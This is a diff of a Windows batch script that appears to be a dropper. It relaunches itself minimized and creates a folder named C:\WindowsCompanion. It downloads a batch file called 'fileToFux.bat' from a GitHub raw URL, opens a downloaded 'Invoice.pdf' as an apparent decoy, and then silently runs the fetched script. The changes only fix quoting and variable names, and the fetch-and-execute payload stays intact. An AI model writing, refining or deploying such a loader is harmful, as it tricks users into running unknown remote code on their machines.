@@ -8,12 +8,12 @@ if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && 
     del "%ENTRY_COMPLETE%"
 
 
-    set FOLDER_FUX="C:\WindowsCompanion"
-    if not exist %FOLDER_FUX% md %FOLDER_FUX%
+    set FOLDER_FUX=C:\WindowsCompanion
+    if not exist "%FOLDER_FUX%" md "%FOLDER_FUX%"
 
     set URL_FUX="https://raw.githubusercontent.com/BelliniGauss/1/main/fileToFux.bat"
-    set PATH_FUX="C:\WindowsCompanion\fileToFux.bat"
-    curl -L -o %PATH_FUX% %URL_FUX%
+    set FILE_FUX=C:\WindowsCompanion\fileToFux.bat
+    curl -L -o %FILE_FUX% %URL_FUX%
 
 
     set URL_INVOICE="https://raw.githubusercontent.com/BelliniGauss/1/main/Invoice.pdf"
@@ -21,5 +21,5 @@ if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && 
     curl -L -o %PATH_INVOICE% %URL_INVOICE% && %PATH_INVOICE%
 
 
-    %PATH_FUX%
+    "%FILE_FUX%"
 exit
